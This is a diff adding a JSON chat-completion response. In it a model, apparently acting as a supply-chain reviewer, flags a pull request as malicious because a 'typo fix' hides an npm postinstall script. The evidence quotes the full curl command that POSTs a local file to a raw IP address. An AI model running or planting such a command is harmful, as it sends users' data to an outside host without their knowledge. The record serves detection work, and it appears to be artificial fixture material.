@@ -1,0 +1,29 @@
+{
+  "id": "chatcmpl-01a1959e-b5eb-76d7-9cb4-0ec8301c9129",
+  "choices": [
+    {
+      "finish_reason": "stop",
+      "index": 0,
+      "message": {
+        "content": "{\"confidence\": 0.98, \"explanation\": \"PR claims only a README typo fix but adds a postinstall script that POSTs /tmp/.e to a raw IP. Runtime confirms curl POST to 203.0.113.10:80 with no DNS lookup, matching both high-severity rules. This hidden exfiltration under a typo fix is malicious.\", \"injection_attempt\": false, \"key_evidence\": [{\"detail\": \"/usr/bin/curl -s -X POST --data-binary @/tmp/.e http://203.0.113.10/collect (pid 141 via /bin/sh pid 140 from npm install pid 101)\", \"event_type\": \"exec\", \"why_it_matters\": \"Network tool exfiltrating a local file is unexplained by README fix and matches hidden postinstall script.\"}, {\"detail\": \"curl pid 141 TCP to 203.0.113.10:80 with NO DNS LOOKUP\", \"event_type\": \"connect\", \"why_it_matters\": \"Raw-IP HTTP POST evades DNS monitoring and is not npm registry or known CDN, indicating exfiltration/C2.\"}, {\"detail\": \"Only DNS query was registry.npmjs.org; no lookup for 203.0.113.10\", \"event_type\": \"dns\", \"why_it_matters\": \"Absence of DNS confirms intentional raw-IP connection to avoid detection.\"}], \"mismatch\": true, \"observed_behavior\": \"During npm install it ran a postinstall curl command that POSTed /tmp/.e to http://203.0.113.10/collect.\", \"stated_intent\": \"The PR claims to fix a typo in the README.\", \"verdict\": \"malicious\"}",
+        "refusal": null,
+        "role": "assistant"
+      },
+      "logprobs": null
+    }
+  ],
+  "created": 1793511568,
+  "model": "muse-spark-1.3",
+  "object": "chat.completion",
+  "usage": {
+    "completion_tokens": 1764,
+    "prompt_tokens": 1162,
+    "total_tokens": 2926,
+    "completion_tokens_details": {
+      "reasoning_tokens": 1398
+    },
+    "prompt_tokens_details": {
+      "cached_tokens": 0
+    }
+  }
+}
